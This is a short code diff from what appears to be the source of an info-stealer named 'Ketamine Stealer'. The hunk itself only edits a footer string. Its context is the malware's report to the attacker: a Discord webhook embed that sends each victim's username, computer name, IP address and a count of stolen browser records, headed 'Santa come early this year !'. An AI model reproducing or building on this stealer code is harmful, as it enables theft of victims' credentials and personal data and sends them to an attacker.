@@ -1453,7 +1453,7 @@ def main():
                 'title': '***Santa come early this year !***',
                 'description': f'```yaml\nUser: {username}\nComputer name: {computer_name}\nIP: {ip}\nTotal information: {success_count} browser information\n```',
                 'color': 3092790,
-                'footer': {'text': 'Ketamine Stealer.'}
+                'footer': {'text': 'Ketamine Stealer'}
             }],
             'username': 'Ketamine',
             'avatar_url': 'https://images-ext-1.discordapp.net/external/0bSNXLXnP_O375r6UNUoIzmXlqa9wpn2w25om5FNAqo/%3Fsize%3D240/https/cdn.discordapp.com/avatars/1321200380629221396/505b6577b9947a137760298848b96a99.webp?format=webp'
